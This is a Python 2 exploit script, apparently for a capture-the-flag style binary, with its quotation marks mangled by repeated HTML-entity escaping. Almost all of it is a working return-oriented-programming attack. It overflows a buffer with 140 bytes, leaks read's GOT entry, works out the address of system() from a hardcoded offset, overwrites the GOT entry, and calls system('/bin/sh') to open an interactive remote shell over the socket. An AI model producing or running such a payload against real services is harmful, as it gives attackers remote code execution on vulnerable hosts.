#!/usr/bin/env python
from socket import *
from time import *
from telnetlib import *
from struct import *
 
p = lambda x: pack(&amp;amp;quot;&amp;amp;lt;L&amp;amp;quot;, x)
up = lambda x: unpack(&amp;amp;quot;&amp;amp;lt;L&amp;amp;quot;, x)[0]
 
## Network Connection
s = socket(AF_INET, SOCK_STREAM)
s.connect((&amp;amp;quot;0.0.0.0&amp;amp;quot;, 12345))
 
sleep(0.1)
#print s.recv(1024)
 
## /bin/sh
binsh = &amp;amp;quot;/bin/sh&amp;amp;quot;
 
## stdin, stdout
stdin = 0
stdout = 1
 
## Address
read_plt = 0x0804832c
read_got = 0x0804961c
write_plt = 0x0804830c
write_got = 0x08049614
 
read_system_offset = 0x9aa40 # read - system offset
binsh_addr = 0x08049530 # .dynamic section
pppr = 0x080484b6 # pop esi; pop edi; pop ebp; ret
 
print &amp;amp;quot;[*] .....inginging...&amp;amp;quot;
 
## Make and Send Payload
 
payload = &amp;amp;quot;a&amp;amp;quot;*140
 
payload += p(read_plt)
payload += p(pppr)
payload += p(stdin)
payload += p(binsh_addr)
payload += p(len(binsh))
 
payload += p(write_plt) # For calc the system() addr
payload += p(pppr)
payload += p(stdout)
payload += p(read_got)
payload += p(len(str(read_got)))
 
payload += p(read_plt) # Overwrite address!
payload += p(pppr)
payload += p(stdin)
payload += p(read_got)
payload += p(len(str(read_got)))
 
payload += p(read_plt) # Call System Function
payload += p(0xaaaabbbb)
payload += p(binsh_addr)
 
########### Send and Recv Data ###########
s.send(payload+&amp;amp;quot;\n&amp;amp;quot;)
s.send(binsh)
 
## Get System Function Address
read = up(s.recv(4)) # save read func's got(real address)
system_addr = read - read_system_offset
print &amp;amp;quot;[*] System Address: %s&amp;amp;quot; % (str(hex(system_addr)))
s.send(p(system_addr))
##########################################
 
## Get the Shell
print &amp;amp;quot;[*] Exploit Complete!&amp;amp;quot;
t = Telnet()
t.sock = s
t.interact()